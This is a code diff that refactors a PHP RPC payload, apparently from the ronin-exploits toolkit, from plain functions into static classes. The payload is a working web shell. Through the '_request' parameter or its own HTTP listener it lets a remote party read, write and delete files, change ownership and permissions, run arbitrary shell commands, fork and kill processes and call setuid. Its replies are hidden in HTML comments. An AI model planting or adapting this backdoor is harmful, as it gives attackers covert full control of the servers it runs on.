@@ -1,277 +1,177 @@
 <?php
 
-function rpc_format_command($args)
+class RPC_Utils
 {
-    $program   = array_shift($args);
-    $arguments = array_map('escapeshellarg',$args);
+    public static function format_command($args)
+    {
+        $program   = array_shift($args);
+        $arguments = array_map('escapeshellarg',$args);
 
-    return $program . ' ' . join(' ',$arguments);
-}
+        return $program . ' ' . join(' ',$arguments);
+    }
 
-function rpc_parse_env($text)
-{
-  $lines = preg_split('/\r?\n/',$text);
-  $env = Array();
+    public static function parse_env($text)
+    {
+        $lines = preg_split('/\r?\n/',$text);
+        $env = Array();
 
-  foreach ($lines as $line)
-  {
-    list($name,$value) = split('=',$line,2);
-    $env[$name] = $value;
-  }
+        foreach ($lines as $line)
+        {
+            list($name,$value) = explode('=',$line,2);
+            $env[$name] = $value;
+        }
 
-  return $env;
+        return $env;
+    }
 }
 
 define('RPC_FS_BLOCK_SIZE', 1024 * 512);
 
-function rpc_fs_read($args)
+class RPC_FileSystem
 {
-  $file = fopen($args[0],"rb");
-  fseek($file,intval($args[1]));
+    public static function read($args)
+    {
+        $file = fopen($args[0],"rb");
+        fseek($file,intval($args[1]));
 
-  $data = fread($file,RPC_FS_BLOCK_SIZE);
+        $data = fread($file,RPC_FS_BLOCK_SIZE);
 
-  fclose($file);
-  return $data;
+        fclose($file);
+        return $data;
+    }
+
+    public static function write($args)
+    {
+        $file = fopen($args[0],"wb");
+        fseek($file,intval($args[1]));
+
+        $length = fwrite($file,$args[2]);
+
+        fclose($file);
+        return $length;
+    }
+
+    public static function stat($args)
+    {
+        $data = stat($args[0]);
+
+        return Array(
+            'inode'     => $data[1],
+            'mode'      => $data[2],
+            'nlinks'    => $data[3],
+            'uid'       => $data[4],
+            'gid'       => $data[5],
+            'size'      => $data[7],
+            'atime'     => $data[8],
+            'mtime'     => $data[9],
+            'ctime'     => $data[10],
+            'blocksize' => $data[11],
+            'blocks'    => $data[12]
+        );
+    }
+
+    public static function readlink($args) { return readlink($args[0]); }
+    public static function getcwd($args)  { return getcwd(); }
+    public static function chdir($args)   { chdir($args[0]); return getcwd(); }
+
+    public static function readdir($args) {
+        $dir = opendir($args[0]);
+        $entries = Array();
+
+        while (($entry = readdir($dir)) != false) {
+            array_push($entries,$entry);
+        }
+
+        return $entries;
+    }
+
+    public static function glob($args)    { return glob($args[0]); }
+    public static function mktemp($args)  { return tempnam(sys_get_temp_dir(),$args[0]); }
+    public static function mkdir($args)   { return mkdir($args[0]); }
+    public static function copy($args)    { return copy($args[0],$args[1]); }
+    public static function unlink($args)  { return unlink($args[0]); }
+    public static function rmdir($args)   { return rmdir($args[0]); }
+    public static function move($args)    { return rename($args[0],$args[1]); }
+    public static function link($args)    { return link($args[0],$args[1]); }
+    public static function chown($args)   { return chown($args[0],$args[1]); }
+    public static function chgrp($args)   { return chgrp($args[0],$args[1]); }
+    public static function chmod($args)   { return chmod($args[0],$args[1]); }
 }
 
-function rpc_fs_write($args)
+class RPC_Process
 {
-  $file = fopen($args[0],"wb");
-  fseek($file,intval($args[1]));
+    public static function getpid($args)  { return @posix_getpid(); }
+    public static function getppid($args) { return @posix_getppid(); }
+    public static function getuid($args)  { return @posix_getuid(); }
+    public static function setuid($args)  { return @posix_setuid(intval($args[0])); }
+    public static function geteuid($args) { return @posix_geteuid(); }
+    public static function seteuid($args) { return @posix_seteuid(intval($args[0])); }
+    public static function getgid($args)  { return @posix_getgid(); }
+    public static function setgid($args)  { return @posix_setgid(intval($args[0])); }
+    public static function getegid($args) { return @posix_getegid(); }
+    public static function setegid($args) { return @posix_setegid(intval($args[0])); }
+    public static function getsid($args)  { return @posix_getsid(); }
+    public static function setsid($args)  { return @posix_setsid(); }
 
-  $length = fwrite($file,$args[2]);
+    public static function spawn($args)
+    {
+        $pid = pcntl_fork();
 
-  fclose($file);
-  return $length;
+        switch ($pid)
+        {
+        case -1:
+            return false;
+        case 0:
+            exec(RPC_Utils::format_command($args));
+        default:
+            return true;
+        }
+    }
+
+    public static function kill($args)
+    {
+        if (isset($args[1])) { $signal = constant("SIG{$args[1]}"); }
+        else                 { $signal = SIGKILL;                   }
+
+        return posix_kill(intval($args[0]),$signal);
+    }
+
+    public static function getcwd($args)  { return RPC_FileSystem::getcwd($args); }
+    public static function chdir($args)   { return RPC_FileSystem::chdir($args); }
+    public static function time($args)    { return time(); }
 }
-
-function rpc_fs_stat($args)
-{
-  $data = stat($args[0]);
-
-  return Array(
-    'inode'     => $data[1],
-    'mode'      => $data[2],
-    'nlinks'    => $data[3],
-    'uid'       => $data[4],
-    'gid'       => $data[5],
-    'size'      => $data[7],
-    'atime'     => $data[8],
-    'mtime'     => $data[9],
-    'ctime'     => $data[10],
-    'blocksize' => $data[11],
-    'blocks'    => $data[12]
-  );
-}
-function rpc_fs_readlink($args) { return readlink($args[0]); }
-
-function rpc_fs_getcwd($args)  { return getcwd(); }
-function rpc_fs_chdir($args)   { chdir($args[0]); return getcwd(); }
-function rpc_fs_readdir($args) {
-  $dir = opendir($args[0]);
-  $entries = Array();
-
-  while (($entry = readdir($dir)) != false) {
-    array_push($entries,$entry);
-  }
-
-  return $entries;
-}
-function rpc_fs_glob($args)    { return glob($args[0]); }
-function rpc_fs_mktemp($args)  { return tempnam(sys_get_temp_dir(),$args[0]); }
-function rpc_fs_mkdir($args)   { return mkdir($args[0]); }
-function rpc_fs_copy($args)    { return copy($args[0],$args[1]); }
-function rpc_fs_unlink($args)  { return unlink($args[0]); }
-function rpc_fs_rmdir($args)   { return rmdir($args[0]); }
-function rpc_fs_move($args)    { return rename($args[0],$args[1]); }
-function rpc_fs_link($args)    { return link($args[0],$args[1]); }
-function rpc_fs_chown($args)   { return chown($args[0],$args[1]); }
-function rpc_fs_chgrp($args)   { return chgrp($args[0],$args[1]); }
-function rpc_fs_chmod($args)   { return chmod($args[0],$args[1]); }
-
-function rpc_process_getpid($args)  { return @posix_getpid(); }
-function rpc_process_getppid($args) { return @posix_getppid(); }
-function rpc_process_getuid($args)  { return @posix_getuid(); }
-function rpc_process_setuid($args)  { return @posix_setuid(intval($args[0])); }
-function rpc_process_geteuid($args) { return @posix_geteuid(); }
-function rpc_process_seteuid($args) { return @posix_seteuid(intval($args[0])); }
-function rpc_process_getgid($args)  { return @posix_getgid(); }
-function rpc_process_setgid($args)  { return @posix_setgid(intval($args[0])); }
-function rpc_process_getegid($args) { return @posix_getegid(); }
-function rpc_process_setegid($args) { return @posix_setegid(intval($args[0])); }
-function rpc_process_getsid($args)  { return @posix_getsid(); }
-function rpc_process_setsid($args)  { return @posix_setsid(); }
-
-function rpc_process_spawn($args)
-{
-  $pid = pcntl_fork();
-
-  switch ($pid)
-  {
-  case -1:
-    return false;
-  case 0:
-    exec(rpc_format_command($args));
-  default:
-    return true;
-  }
-}
-
-function rpc_process_kill($args)
-{
-  if (isset($args[1])) { $signal = constant("SIG{$args[1]}"); }
-  else                 { $signal = SIGKILL;                   }
-
-  return posix_kill(intval($args[0]),$signal);
-}
-
-function rpc_process_getcwd($args)  { return rpc_fs_getcwd($args); }
-function rpc_process_chdir($args)   { return rpc_fs_chdir($args); }
-function rpc_process_time($args)    { return time(); }
 
 define('RPC_SHELL_DELIMINATOR',str_repeat('#',80));
 
-function rpc_shell_exec($args)
+class RPC_Shell
 {
-  $commands = Array(
-    Array('env'),
-    Array('echo', RPC_SHELL_DELIMINATOR),
-    $args,
-    Array('echo', RPC_SHELL_DELIMINATOR),
-    Array('env')
-  );
-  $command = join('; ',array_map('rpc_format_command',$commands));
-
-  $output  = shell_exec($command);
-
-  list($orig_env,$output,$new_env) = explode(RPC_SHELL_DELIMINATOR,$output,3);
-
-  $output   = chop($output);
-  $orig_env = rpc_parse_env($orig_env);
-  $new_env  = rpc_parse_env($new_env);
-
-  return Array(
-    'output' => $output,
-    'env' => array_diff_assoc($orig_env,$new_env)
-  );
-}
-
-if (!function_exists('json_encode'))
-{
-  // https://code.google.com/p/simplejson-php/
-  function json_encode($value)
-  {
-    if ($value === null) { return 'null'; };  // gettype fails on null?
-
-    $out = '';
-    $esc = "\"\\/\n\r\t" . chr( 8 ) . chr( 12 );  // escaped chars
-    $l   = '.';  // decimal point
-
-    switch ( gettype( $value ) ) 
+    public static function exec($args)
     {
-    case 'boolean':
-      $out .= $value ? 'true' : 'false';
-      break;
+        $commands = Array(
+            Array('env'),
+            Array('echo', RPC_SHELL_DELIMINATOR),
+            $args,
+            Array('echo', RPC_SHELL_DELIMINATOR),
+            Array('env')
+        );
+        $command = join('; ',array_map(array('RPC_Utils', 'format_command'),$commands));
 
-    case 'float':
-    case 'double':
-      // PHP uses the decimal point of the current locale but JSON expects %x2E
-      $l = localeconv();
-      $l = $l['decimal_point'];
-      // fallthrough...
+        $output  = shell_exec($command);
 
-    case 'integer':
-      $out .= str_replace( $l, '.', $value );  // what, no getlocale?
-      break;
+        list($orig_env,$output,$new_env) = explode(RPC_SHELL_DELIMINATOR,$output,3);
 
-    case 'array':
-      // if array only has numeric keys, and is sequential... ?
-      for ($i = 0; ($i < count( $value ) && isset( $value[$i]) ); $i++);
-      if ($i === count($value)) {
-        // it's a "true" array... or close enough
-        $out .= '[' . implode(',', array_map('toJSON', $value)) . ']';
-        break;
-      }
-      // fallthrough to object for associative arrays... 
+        $output   = chop($output);
+        $orig_env = RPC_Utils::parse_env($orig_env);
+        $new_env  = RPC_Utils::parse_env($new_env);
 
-    case 'object':
-      $arr = is_object($value) ? get_object_vars($value) : $value;
-      $b = array();
-      foreach ($arr as $k => $v) {
-        $b[] = '"' . addcslashes($k, $esc) . '":' . toJSON($v);
-      }
-      $out .= '{' . implode( ',', $b ) . '}';
-      break;
-
-    default:  // anything else is treated as a string
-      return '"' . addcslashes($value, $esc) . '"';
-      break;
+        return Array(
+            'output' => $output,
+            'env' => array_diff_assoc($orig_env,$new_env)
+        );
     }
-    return $out;
-  }
 }
 
-if (!function_exists('json_decode'))
-{
-  // https://code.google.com/p/simplejson-php/
-  function json_decode($json, $assoc = false) {
-    /* by default we don't tolerate ' as string delimiters
-       if you need this, then simply change the comments on
-       the following lines: */
 
-    // $matchString = '/(".*?(?<!\\\\)"|\'.*?(?<!\\\\)\')/';
-    $matchString = '/".*?(?<!\\\\)"/';
-
-    // safety / validity test
-    $t = preg_replace( $matchString, '', $json );
-    $t = preg_replace( '/[,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/', '', $t );
-    if ($t != '') { return null; }
-
-    // build to/from hashes for all strings in the structure
-    $s2m = array();
-    $m2s = array();
-    preg_match_all( $matchString, $json, $m );
-    foreach ($m[0] as $s) {
-      $hash       = '"' . md5( $s ) . '"';
-      $s2m[$s]    = $hash;
-      $m2s[$hash] = str_replace( '$', '\$', $s );  // prevent $ magic
-    }
-
-    // hide the strings
-    $json = strtr( $json, $s2m );
-
-    // convert JS notation to PHP notation
-    $a = ($assoc) ? '' : '(object) ';
-    $json = strtr( $json, 
-      array(
-        ':' => '=>', 
-        '[' => 'array(', 
-        '{' => "{$a}array(", 
-        ']' => ')', 
-        '}' => ')'
-      ) 
-    );
-
-    // remove leading zeros to prevent incorrect type casting
-    $json = preg_replace( '~([\s\(,>])(-?)0~', '$1$2', $json );
-
-    // return the strings
-    $json = strtr( $json, $m2s );
-
-    /* "eval" string and return results. 
-       As there is no try statement in PHP4, the trick here 
-       is to suppress any parser errors while a function is 
-       built and then run the function if it got made. */
-    $f = @create_function( '', "return {$json};" );
-    $r = ($f) ? $f() : null;
-
-    // free mem (shouldn't really be needed, but it's polite)
-    unset( $s2m ); unset( $m2s ); unset( $f );
-
-    return $r;
-  }
-}
 
 global $rpc_exception;
 
@@ -286,34 +186,51 @@ function rpc_error_handler($errno,$errstr)
   }
 }
 
-function rpc_serialize($message) {
-  return base64_encode(json_encode($message));
-}
-function rpc_deserialize($data) {
-  return json_decode(base64_decode($data));
-}
-
-function rpc_lookup($names) { return "rpc_" . join($names,'_'); }
-function rpc_call($request)
+class RPC
 {
-  if (isset($request->cwd)) { chdir($request->cwd); }
-
-  if (isset($request->env) && is_array($request->env))
-  {
-    foreach ($request->env as $name => $value)
-    {
-      putenv("{$name}={$value}");
+    public static function serialize($message) {
+        return base64_encode(json_encode($message));
     }
-  }
 
-  $method    = rpc_lookup(split('\.', $request->name));
-  $arguments = $request->arguments;
+    public static function deserialize($data) {
+        return json_decode(base64_decode($data));
+    }
 
-  set_error_handler('rpc_error_handler');
-  $value = call_user_func($method,$arguments);
+    public static function lookup($names) {
+        $map = array(
+            'format' => 'Utils',
+            'parse' => 'Utils',
+            'fs' => 'FileSystem',
+            'process' => 'Process',
+            'shell' => 'Shell'
+        );
+        $prefix = $names[0];
+        $class = 'RPC_' . (isset($map[$prefix]) ? $map[$prefix] : ucfirst($prefix));
+        $method = $names[1];
+        return array($class, $method);
+    }
 
-  if (isset($rpc_exception)) { return Array('exception' => $rpc_exception); }
-  else                       { return Array('return'    => $value);         }
+    public static function call($request)
+    {
+        if (isset($request->cwd)) { chdir($request->cwd); }
+
+        if (isset($request->env) && is_array($request->env))
+        {
+            foreach ($request->env as $name => $value)
+            {
+                putenv("{$name}={$value}");
+            }
+        }
+
+        list($class, $method) = self::lookup(explode('.', $request->method));
+        $arguments = $request->arguments;
+
+        set_error_handler('rpc_error_handler');
+        $value = call_user_func(array($class, $method), $arguments);
+
+        if (isset($rpc_exception)) { return Array('exception' => $rpc_exception); }
+        else                       { return Array('return'    => $value);         }
+    }
 }
 
 function is_ipaddress($string){
@@ -371,7 +288,7 @@ function start_standalone_http_server($port = NULL, $addr = NULL) {
       }
       $request = urldecode($matches[2]);
 
-      $response = rpc_serialize(rpc_call(rpc_deserialize($request)));
+      $response = RPC::serialize(RPC::call(RPC::deserialize($request)));
       $body = "<!-- <rpc:response>{$response}</rpc:response> -->";
       $header = "Content-Type: text/html\r\n";
       $header .= "Server: PHP ". phpversion() ."\r\n";
@@ -391,8 +308,8 @@ define('RPC_BASE_URL', 'http://ronin-ruby.github.com/data/ronin-exploits/payload
 
 if (isset($_REQUEST['_request']))
 {
-  $request  = rpc_deserialize(rawurldecode($_REQUEST['_request']));
-  $response = rpc_serialize(rpc_call($request));
+  $request  = RPC::deserialize(rawurldecode($_REQUEST['_request']));
+  $response = RPC::serialize(RPC::call($request));
 
   echo "<!-- <rpc:response>{$response}</rpc:response> -->";
 }
